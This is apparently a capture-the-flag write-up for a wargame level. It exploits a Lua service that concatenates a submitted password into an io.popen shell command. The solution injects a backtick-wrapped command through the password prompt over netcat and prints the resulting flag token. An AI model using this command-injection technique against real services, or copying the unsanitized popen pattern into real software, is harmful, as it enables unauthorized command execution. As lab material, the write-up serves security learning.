-> ls -la

-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua

-> cat level11.lua

(The cat output is in the level11.lua file in this same directory)

As we can see in the following line of the file :

prog = io.popen("echo "..pass.." | sha1sum", "r")

It builds a shell command by pasting the value we send (pass)
after echo, then executes that command.

So let's try !

-> nc 127.0.0.1 5151

Password:

-> getflag > /tmp/flag

Erf nope..

-> cat /tmp/flag

getflag

-> nc 127.0.0.1 5151

Password:

-> `getflag` > /tmp/flag

Erf nope..

-> cat /tmp/flag

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

-> su level12 ..
